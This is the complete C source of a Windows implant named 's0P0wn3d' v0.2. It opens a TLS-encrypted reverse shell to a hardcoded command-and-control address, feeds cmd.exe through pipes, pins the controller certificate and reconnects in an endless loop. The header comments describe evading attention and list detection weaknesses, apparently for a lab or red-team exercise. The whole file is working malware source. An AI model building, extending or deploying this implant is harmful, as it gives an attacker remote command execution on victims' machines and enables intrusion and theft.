/*
 * s0P0wn3d implant - v0.2
 *
 * Reverse shell over TLS (SChannel), with length-prefixed framing.
 * Unlike v0.1, cmd.exe no longer talks to the socket: it is spawned with
 * anonymous pipes, and a single-threaded event loop shuttles framed,
 * encrypted traffic between the controller and those pipes.
 *
 * Single-threaded on purpose: SSPI contexts are not thread-safe, and one
 * thread doing poll-based IO draws less attention than a thread pool.
 *
 * Trust model: the controller certificate is pinned by SHA-256
 * (implant/cert_pin.h, generated by tools/make_certs.sh). No system CA
 * store is consulted; a MITM with any other certificate fails the pin.
 *
 * KNOWN WEAKNESSES (documented on purpose, fixed in later iterations):
 *   - cmd.exe spawned as a child process (Sysmon EID 1)     -> v0.3: built-ins
 *   - hardcoded C2 host/port (static signature)             -> v0.3: config
 *   - visible console window if launched from Explorer      -> v0.3: subsystem
 *   - TLS on a nonstandard port with a self-signed cert is
 *     fingerprintable by metadata (JA3/JA4, no SNI)         -> blue-team note
 *   - no persistence, no evasion beyond the encrypted channel
 *
 * Build (repo root):
 *   gcc -Os -o implant.exe implant/implant.c implant/tls_schannel.c \
 *       -lws2_32 -lsecur32 -lbcrypt -lcrypt32
 *   (or x86_64-w64-mingw32-gcc from WSL, same flags)
 *   C2_HOST / C2_PORT can be overridden at build time, e.g.:
 *   gcc ... -DC2_HOST='"127.0.0.1"' -DC2_PORT=4444
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>

#include "tls_schannel.h"
#include "cert_pin.h"

#ifndef C2_HOST
#define C2_HOST "192.168.189.1" /* host VMnet1 address - lab default */
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif
#define RETRY_DELAY_MS 5000

#define PIPE_BUF 4096
#define MAX_FRAME (1 << 20)
#define POLL_MS 20

typedef struct {
    HANDLE stdin_w;      /* write end of cmd.exe's stdin pipe */
    HANDLE stdout_r;     /* read end of cmd.exe's stdout pipe */
    HANDLE process;
    unsigned char *net;  /* reassembly buffer for inbound frames */
    size_t net_len;
} session;

static bool winsock_init(void)
{
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

static SOCKET c2_connect(void)
{
    /* NO_HANDLE_INHERIT: cmd.exe must not inherit the C2 socket. */
    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0,
                             WSA_FLAG_NO_HANDLE_INHERIT);
    if (sock == INVALID_SOCKET)
        return INVALID_SOCKET;

    struct sockaddr_in c2 = { 0 };
    c2.sin_family = AF_INET;
    c2.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &c2.sin_addr);

    if (connect(sock, (struct sockaddr *)&c2, sizeof(c2)) != 0) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    return sock;
}

/* Frame = 4-byte big-endian length + payload. */
static bool frame_write(tls_conn *t, const unsigned char *data, uint32_t len)
{
    unsigned char hdr[4] = {
        (unsigned char)(len >> 24), (unsigned char)(len >> 16),
        (unsigned char)(len >> 8), (unsigned char)len
    };
    return tls_write(t, hdr, 4) && tls_write(t, data, (int)len);
}

/* Pump cmd.exe output into TLS frames. Returns false if the pipe broke. */
static bool shell_to_net(session *s, tls_conn *tls)
{
    unsigned char buf[PIPE_BUF];
    DWORD avail = 0;

    while (PeekNamedPipe(s->stdout_r, NULL, 0, NULL, &avail, NULL) && avail) {
        DWORD n = 0;
        DWORD want = avail < sizeof(buf) ? avail : (DWORD)sizeof(buf);
        if (!ReadFile(s->stdout_r, buf, want, &n, NULL) || n == 0)
            return false;
        if (!frame_write(tls, buf, n))
            return false;
    }
    return true;
}

/* Feed complete inbound frames to cmd.exe's stdin.
   Returns false if the connection or pipe is dead. */
static bool net_to_shell(session *s, tls_conn *tls)
{
    int n = tls_read_nb(tls, s->net + s->net_len,
                        (int)(MAX_FRAME - s->net_len));
    if (n < 0)
        return false;
    s->net_len += (size_t)n;

    while (s->net_len >= 4) {
        uint32_t len = ((uint32_t)s->net[0] << 24) | ((uint32_t)s->net[1] << 16) |
                       ((uint32_t)s->net[2] << 8) | s->net[3];
        if (len > MAX_FRAME - 4)
            return false; /* garbage length: desync, drop the session */
        if (s->net_len < 4 + len)
            break; /* partial frame: wait for the rest */
        DWORD written;
        if (len > 0 && !WriteFile(s->stdin_w, s->net + 4, len, &written, NULL))
            return false;
        memmove(s->net, s->net + 4 + len, s->net_len - 4 - len);
        s->net_len -= 4 + len;
    }
    return true;
}

static bool spawn_shell(HANDLE stdin_r, HANDLE stdout_w, PROCESS_INFORMATION *pi)
{
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = stdin_r;
    si.hStdOutput = stdout_w;
    si.hStdError = stdout_w;

    return CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0,
                          NULL, NULL, &si, pi) != 0;
}

static void run_session(tls_conn *tls)
{
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE stdin_r = NULL, stdout_w = NULL;
    session s = { 0 };

    if (!CreatePipe(&stdin_r, &s.stdin_w, &sa, 0) ||
        !CreatePipe(&s.stdout_r, &stdout_w, &sa, 0))
        goto cleanup;
    /* The child must not inherit the parent's pipe ends. */
    SetHandleInformation(s.stdin_w, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(s.stdout_r, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi = { 0 };
    if (!spawn_shell(stdin_r, stdout_w, &pi))
        goto cleanup;
    s.process = pi.hProcess;
    CloseHandle(stdin_r);  stdin_r = NULL;
    CloseHandle(stdout_w); stdout_w = NULL;
    CloseHandle(pi.hThread);

    s.net = malloc(MAX_FRAME);
    if (!s.net)
        goto cleanup;

    while (shell_to_net(&s, tls) && net_to_shell(&s, tls)) {
        if (WaitForSingleObject(s.process, 0) == WAIT_OBJECT_0)
            break; /* operator typed exit: cmd.exe ended on its own */
        Sleep(POLL_MS);
    }

cleanup:
    if (s.process) {
        TerminateProcess(s.process, 1);
        CloseHandle(s.process);
    }
    free(s.net);
    if (stdin_r) CloseHandle(stdin_r);
    if (s.stdin_w) CloseHandle(s.stdin_w);
    if (s.stdout_r) CloseHandle(s.stdout_r);
    if (stdout_w) CloseHandle(stdout_w);
}

int main(void)
{
    if (!winsock_init())
        return 1;

    for (;;) {
        SOCKET sock = c2_connect();
        if (sock != INVALID_SOCKET) {
            tls_conn tls;
            if (tls_client_open(&tls, sock, SERVER_CERT_SHA256)) {
                run_session(&tls);
                tls_close(&tls);
            }
            closesocket(sock);
        }
        Sleep(RETRY_DELAY_MS);
    }

    WSACleanup();
    return 0;
}
